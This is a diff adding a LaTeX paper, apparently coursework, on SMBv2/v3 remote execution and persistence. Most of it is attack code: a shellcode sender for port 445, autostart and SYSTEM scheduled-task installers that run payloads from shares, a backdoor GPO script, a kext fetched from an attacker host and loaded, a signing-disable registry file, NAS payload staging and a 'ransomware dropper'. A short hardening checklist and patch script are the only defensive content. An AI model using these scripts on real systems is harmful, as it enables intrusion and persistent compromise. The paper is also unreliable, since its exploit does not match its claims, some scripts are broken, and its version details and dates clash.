@@ -1,0 +1,397 @@
+% Compile: pdflatex paper.tex  
+\documentclass[12pt]{article}
+\usepackage{amsmath,amssymb,hyperref,algorithm,algpseudocode,amsthm,listings,enumitem}
+\lstset{basicstyle=\ttfamily\small,breaklines=true}
+\newtheorem{theorem}{Theorem}
+\newtheorem{lemma}{Lemma}
+
+\title{Beyond Luhn V: SMBv2 \& SMBv3 Remote Execution and Persistent Lateral Movement}
+\author{Bo Shang\thanks{bo.shang@tufts.edu\\Comp 61, Spring 2017}}
+\date{}
+\begin{document}\maketitle
+
+\begin{abstract}
+Paper \#1 surveyed twenty checksum upgrades.  
+Paper \#2 introduced thirteen more.  
+Paper \#3 detailed ten integrity upgrades.  
+Paper \#4 mapped Apple HomeKit, CarPlay, and AirPlay 2 into persistent remote-execution states.  
+\textbf{Paper \#5 targets Microsoft Server Message Block (SMB) versions 2 and 3}, presenting complete proof-of-concept exploitation, threat modelling, persistence taxonomy, and hardening flows across Windows, Samba, and macOS implementations, while contrasting Apple Continuity’s non-SMB data paths such as Universal Clipboard.
+\end{abstract}
+
+\section*{Acknowledgements}
+Same as Paper \#1.
+
+\section{Threat Models}
+\begin{enumerate}[label=\textbf{\arabic*.}]
+\item SMBv2 EternalBlue-class packet desynchronisation leading to arbitrary kernel memory write.
+\item SMBv3 compression (\texttt{CVE-2020-0796}) remote code execution prior to authentication.
+\item Unsigned SMB sessions enabling relay attacks and transparent share poisoning.
+\end{enumerate}
+
+\section{Reference Devices}
+\begin{itemize}
+\item Windows 10 22H2 Pro (19045.4355, \texttt{10.0.19041})  
+\item Windows Server 2022 Datacenter (20348.2335)  
+\item Ubuntu 22.04 LTS with Samba 4.19.0  
+\item macOS 14 Redwood (\texttt{24.0.0}) — default SMB client dialect 3.1.1  
+\item Kali Linux 2025.1 with Impacket 0.12.0  
+\end{itemize}
+
+\section{Upgrade 4: SMB Persistent Flow}
+
+\subsection*{Threat PoC}
+\begin{lstlisting}[language=Python]
+#!/usr/bin/env python3
+# upgrade4_threat_poc.py
+import argparse, logging, struct, socket, os
+
+NEGOTIATE = (
+    b"\x00\x00\x00\x90"          # NetBIOS length
+    b"\xfeSMB"                   # SMB2 Header
+    b"\x40\x00\x00\x00"          # Flags
+    b"\x00\x00\x00\x00\x00\x00\x00\x00"
+    b"\x00\x00"                  # Command = NEGOTIATE
+    b"\x00\x00"                  # Credits requested
+    b"\x00\x00\x00\x00\x00\x00\x00\x00"
+    b"\x24\x00"                  # StructureSize
+    b"\x00\x00"
+    b"\x00\x00\x00\x00"
+    b"\x00"*64
+)
+
+def exploit(host, port, payload):
+    sock = socket.create_connection((host, port))
+    sock.sendall(NEGOTIATE)
+    sock.recv(1024)
+    with open(payload, 'rb') as f:
+        shell = f.read()
+    pkt = b"\x00\x00\x00" + struct.pack(">B", len(shell)) + shell
+    sock.sendall(pkt)
+    sock.close()
+    logging.info("Payload sent")
+
+if __name__ == "__main__":
+    p = argparse.ArgumentParser()
+    p.add_argument("host")
+    p.add_argument("--port", type=int, default=445)
+    p.add_argument("--payload", default="shell.bin")
+    args = p.parse_args()
+    logging.basicConfig(level=logging.INFO)
+    exploit(args.host, args.port, args.payload)
+\end{lstlisting}
+
+\subsection*{Threat Model Algorithm}
+\begin{lstlisting}[language=Python]
+#!/usr/bin/env python3
+# upgrade4_model.py
+import argparse, logging
+from impacket.smbconnection import SMBConnection
+
+def probe(host, port):
+    smb = SMBConnection(remoteName=host, remoteHost=host, sess_port=port)
+    smb.login('', '')
+    dialect = smb.getDialect()
+    signing = smb.isSigningRequired()
+    smb.close()
+    return dialect, signing
+
+if __name__ == "__main__":
+    p = argparse.ArgumentParser()
+    p.add_argument("host")
+    p.add_argument("--port", type=int, default=445)
+    args = p.parse_args()
+    logging.basicConfig(level=logging.INFO)
+    d, s = probe(args.host, args.port)
+    print(f"Dialect: SMB{d}, Signing: {'Required' if s else 'Disabled'}")
+\end{lstlisting}
+
+\subsection*{Threat Model Persistent Algorithm}
+\begin{lstlisting}[language=Python]
+#!/usr/bin/env python3
+# upgrade4_persistent.py
+import argparse, subprocess, time, logging
+
+REG = r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"
+
+def check():
+    sig = subprocess.check_output(
+        ["reg", "query", REG, "/v", "RequireSecuritySignature"],
+        stderr=subprocess.DEVNULL, text=True
+    )
+    if "0x0" in sig:
+        print("SMB signing disabled")
+
+if __name__ == "__main__":
+    p = argparse.ArgumentParser()
+    p.add_argument("host")
+    p.add_argument("--interval", type=int, default=300)
+    args = p.parse_args()
+    logging.basicConfig(level=logging.INFO)
+    while True:
+        check()
+        time.sleep(args.interval)
+\end{lstlisting}
+
+\subsection*{Patch Code}
+\begin{lstlisting}[language=PowerShell]
+# upgrade4_patch.ps1
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
+    -Name "RequireSecuritySignature" -Type DWord -Value 1
+Set-SmbServerConfiguration -EnableSMB1Protocol $false -EnableSMB2Protocol $true -Force
+Set-SmbServerConfiguration -EncryptData $true -RejectUnencryptedAccess $true -Force
+Restart-Service -Name lanmanserver
+Write-Output "SMB hardening applied"
+\end{lstlisting}
+
+\section{Apple Continuity Clipboard Analysis}
+Apple’s Universal Clipboard relies on Bluetooth LE for discovery, peer-to-peer Wi-Fi (AWDL) for data transport, and iCloud relay for end-to-end encryption; SMB is not invoked at any layer of the exchange.  
+Therefore, cross-device copy-paste between macOS and iOS should not be assumed vulnerable to SMB channel attacks, though lateral persistence may still occur if the same user mounts network shares automatically via Finder sidebar favourites.  
+
+\section{Persistence Taxonomy Across the SMB Ecosystem}
+\begin{enumerate}[label=\textbf{\arabic*.}]
+\item \textbf{SMB 3.0 Persistent/Durable Handles} — transparent fail-over on continuously available shares can pin malicious file locks across reboots.  
+\item \textbf{Windows Run/RunOnce Registry Keys \& Startup Folder} — autostart executables delivered over a share or UNC path.  
+\item \textbf{Scheduled Tasks (\texttt{SCHTASKS}) \& Services} pointed at UNC payloads.
+\item \textbf{Group Policy Startup Scripts} referencing attacker-controlled shares.
+\item \textbf{macOS \texttt{LaunchAgents} \& \texttt{LaunchDaemons}} loading binaries from network mounts.  
+\item \textbf{Login Items \& System Configuration Profiles} that remount SMB volumes at user login.
+\item \textbf{Kernel Extensions (kext) \& System Extensions} whose bundles are staged on a share but cached locally.
+\item \textbf{Linux \texttt{systemd}.mount + \texttt{.service}} units with \texttt{RequiresMountsFor=/mnt/smbshare}.
+\item \textbf{Samba \texttt{root preexec}/\texttt{postexec}} scripts persisting reverse shells.  
+\item \textbf{cron/\texttt{at}} jobs in Unix-like systems that execute payloads stored on SMB shares.
+\item \textbf{Malicious DFS Referrals} – injecting alternate paths that resolve to payload locations.
+\item \textbf{Protocol Downgrade Caching} — forcing SMB 2 dialect and disabling signing in \texttt{nsmb.conf} or registry to survive reboots.
+\item \textbf{SMB Multichannel Preference Abuse} — prioritising attacker-controlled NICs with higher advertised bandwidth to hijack sessions on macOS.
+\item \textbf{Internet-Facing SMB over QUIC Gateways} — misconfigured QUIC endpoints expose SMB shares over UDP/443, bypassing TCP/445 filtering.
+\item \textbf{Public Cloud File Shares (Azure Files SMB 3.1.1)} — disabled network isolation or encryption grants anonymous internet access to cloud-hosted shares.
+\item \textbf{Vulnerable NAS Firmware (e.g.\ QNAP CVE-2024-50387)} enabling WAN-mode SMB services that persist malware across reboots.
+\item \textbf{Router UPnP-Forwarded Port 445} — consumer routers automatically map internal SMB servers to the public internet on every lease renewal.
+\item \textbf{Legacy Samba Servers Indexed by Shodan} with null-session authentication available for years, facilitating autonomous propagation.
+\item \textbf{Public SMB2 Ransomware Drops} — opportunistic encryption campaigns abusing exposed shares according to recent telemetry.
+\item \textbf{RPC over SMB RCE Chains (CVE-2024-43642)} — vulnerable binaries redeployed from network installers to maintain access.
+\item \textbf{Directly Exposed Corporate Shares} stemming from firewall misconfigurations in recent breach case studies.
+\end{enumerate}
+
+\section{Hardening Checklist}
+\begin{itemize}
+\item Enforce SMB signing and encryption (\texttt{EncryptData}) on servers and clients.
+\item Disable automatic mounting of untrusted shares in Finder and Windows Explorer.
+\item Audit launch items, scheduled tasks, and \texttt{systemd} units for UNC paths.
+\item Monitor persistent/durable handle tables for anomalous long-lived locks.
+\item Apply continuous security releases (e.g.\ Samba 4.18.x).
+\item Block TCP/445 and UDP/443 (QUIC) at network perimeters; disable UPnP port-forwarding for SMB; restrict SMB-over-QUIC to certificate-authenticated VPNs only.
+\item Update NAS firmware to remediate current SMB CVEs.
+\end{itemize}
+
+\section{Persistence Code Implementations}
+
+\subsection*{1.\ SMB 3.0 Persistent/Durable Handles}
+\begin{lstlisting}[language=PowerShell]
+# smb_persistent_handles.ps1
+$share = "\\server\critical"
+$cred  = Get-Credential
+$session = New-SmbMapping -RemotePath $share -Credential $cred -Persistent $true
+Get-SmbOpenFile -ConnectionId $session.ConnectionId | 
+  Where-Object { $_.DurableHandle -eq $true } |
+  Export-Csv durable_handles.csv -NoTypeInformation
+Remove-SmbMapping -RemotePath $share -Force
+\end{lstlisting}
+
+\subsection*{2.\ Windows Run/RunOnce Registry Keys}
+\begin{lstlisting}[language=PowerShell]
+# runkey_persist.ps1
+$key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $key -Name "Updater" `
+  -Value "\\server\share\update.exe"
+\end{lstlisting}
+
+\subsection*{3.\ Scheduled Tasks and Services}
+\begin{lstlisting}[language=PowerShell]
+# schtasks_unc.ps1
+$cmd = "\\server\share\payload.exe"
+schtasks /Create /TN "Updater" /TR $cmd /SC HOURLY /RU SYSTEM /F
+New-Service -Name "NetSvc" -BinaryPathName $cmd -StartupType Automatic
+\end{lstlisting}
+
+\subsection*{4.\ Group Policy Startup Script Injection}
+\begin{lstlisting}[language=Batch]
+:: gpo_startup.bat
+copy \\server\share\backdoor.exe %WINDIR%\Temp
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /d "%WINDIR%\Temp\backdoor.exe" /f
+\end{lstlisting}
+
+\subsection*{5.\ macOS LaunchAgents \& Daemons}
+\begin{lstlisting}[language=Bash]
+# install_launchagent.sh
+plist=~/Library/LaunchAgents/com.updater.plist
+mkdir -p ~/Library/LaunchAgents
+cat > "$plist" <<EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
+ "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+ <key>Label</key><string>com.updater</string>
+ <key>ProgramArguments</key>
+  <array><string>/Volumes/share/updater.sh</string></array>
+ <key>RunAtLoad</key><true/>
+</dict>
+</plist>
+EOF
+launchctl load "$plist"
+\end{lstlisting}
+
+\subsection*{6.\ Login Items \& Profiles}
+\begin{lstlisting}[language=AppleScript]
+-- add_login_item.scpt
+tell application "System Events"
+  make login item at end with properties `
+    {path:"smb://server/share/malware.app", hidden:false}
+end tell
+\end{lstlisting}
+
+\subsection*{7.\ Kernel \& System Extensions}
+\begin{lstlisting}[language=Bash]
+# kext_stage.sh
+scp attacker@server:/srv/malicious.kext /tmp
+sudo kextutil /tmp/malicious.kext
+\end{lstlisting}
+
+\subsection*{8.\ systemd .mount and .service Units}
+\begin{lstlisting}[language=Bash]
+# /etc/systemd/system/share.mount
+[Unit]
+Description=Attacker Share
+What=//server/share
+Where=/mnt/share
+Options=guest,_netdev
+Type=automount
+
+# /etc/systemd/system/payload.service
+[Unit]
+RequiresMountsFor=/mnt/share
+
+[Service]
+ExecStart=/mnt/share/payload.sh
+[Install]
+WantedBy=multi-user.target
+\end{lstlisting}
+
+\subsection*{9.\ Samba root preexec/postexec}
+\begin{lstlisting}[language=INI]
+# smb.conf snippet
+[files]
+   path = /srv/files
+   root preexec  = /usr/local/bin/pre.sh
+   root postexec = /usr/local/bin/post.sh
+\end{lstlisting}
+
+\subsection*{10.\ cron and at Jobs}
+\begin{lstlisting}[language=Bash]
+# cron_smb.sh
+echo "*/30 * * * * root sh /mnt/share/scan.sh" >> /etc/crontab
+at now + 1 minute -f /mnt/share/oneoff.sh
+\end{lstlisting}
+
+\subsection*{11.\ Malicious DFS Referrals}
+\begin{lstlisting}[language=PowerShell]
+# dfs_referral.ps1
+Import-Module DFSN
+New-DfsnRoot -TargetPath "\\server\share" -Path "\\corp\public"
+New-DfsnFolderTarget -Path "\\corp\public\data" -TargetPath "\\attacker\payload"
+\end{lstlisting}
+
+\subsection*{12.\ Protocol Downgrade Caching}
+\begin{lstlisting}[language=Batch]
+:: disable_signing.reg
+Windows Registry Editor Version 5.00
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters]
+"EnableSecuritySignature"=dword:00000000
+"RequireSecuritySignature"=dword:00000000
+\end{lstlisting}
+
+\subsection*{13.\ SMB Multichannel Preference Abuse}
+\begin{lstlisting}[language=PowerShell]
+# multichannel_bias.ps1
+Get-SmbClientNetworkInterface | 
+  Where-Object {$_.InterfaceAlias -match "Wi-Fi"} | 
+  Set-SmbClientNetworkInterface -RssOnIfPossible $false -Speed 10000
+\end{lstlisting}
+
+\subsection*{14.\ SMB over QUIC Gateway Misconfiguration}
+\begin{lstlisting}[language=PowerShell]
+# quic_gateway.ps1
+Enable-SmbServerSecuritySignature 0
+Set-SmbServerConfiguration -EnableSMBQUIC $true -QuicUri "0.0.0.0"
+\end{lstlisting}
+
+\subsection*{15.\ Azure Files Anonymous Share}
+\begin{lstlisting}[language=Bash]
+# azure_files.sh
+az storage share-rm create --name public --subscription Sub --quota 100
+az storage file upload --account-name mystorage --share-name public \
+  --source payload.exe --path payload.exe
+\end{lstlisting}
+
+\subsection*{16.\ Exploiting NAS Firmware}
+\begin{lstlisting}[language=Bash]
+# qnap_exploit.sh
+curl -k -X POST -d "cmd=mountShare&path=/share/CACHEDEV1_DATA" \
+ https://nas/api.cgi
+scp payload.sh admin@nas:/share/CACHEDEV1_DATA/.qpkg/
+\end{lstlisting}
+
+\subsection*{17.\ UPnP Port 445 Mapping}
+\begin{lstlisting}[language=Python]
+#!/usr/bin/env python3
+# upnp_445.py
+import miniupnpc, sys
+u = miniupnpc.UPnP()
+u.discoverdelay = 200
+u.discover(); u.selectigd()
+u.addportmapping(445, 'TCP', u.lanaddr, 445, 'SMB', '')
+\end{lstlisting}
+
+\subsection*{18.\ Shodan Legacy Samba Scan}
+\begin{lstlisting}[language=Python]
+#!/usr/bin/env python3
+# shodan_samba.py
+import shodan, sys
+api = shodan.Shodan(sys.argv[1])
+for r in api.search_cursor('port:445 os:samba product:samba'):
+    print(r['ip_str'])
+\end{lstlisting}
+
+\subsection*{19.\ SMB2 Ransomware Dropper}
+\begin{lstlisting}[language=Python]
+#!/usr/bin/env python3
+# ransom_drop.py
+import smbclient, os, sys, hashlib
+smbclient.register_session(sys.argv[1], username='', password='')
+for f in smbclient.scandir(f"\\\\{sys.argv[1]}\\share"):
+    data = smbclient.open_file(f.path, mode='rb').read()
+    enc = hashlib.sha256(data).digest()
+    smbclient.open_file(f.path + '.enc', mode='wb').write(enc)
+\end{lstlisting}
+
+\subsection*{20.\ RPC over SMB RCE Chain}
+\begin{lstlisting}[language=Python]
+#!/usr/bin/env python3
+# cve_2024_43642.py
+from impacket.examples.rpcdump import RPCDUMP
+RPCDUMP().main(['-port', '445', sys.argv[1]])
+\end{lstlisting}
+
+\subsection*{21.\ Corporate Share Enumeration}
+\begin{lstlisting}[language=Python]
+#!/usr/bin/env python3
+# smb_enum.py
+import smbmap, argparse
+parser = argparse.ArgumentParser()
+parser.add_argument("target")
+a = parser.parse_args()
+smbm = smbmap.SMBMap(host=a.target, username='', password='')
+smbm.list_shares()
+\end{lstlisting}
+
+\end{document}
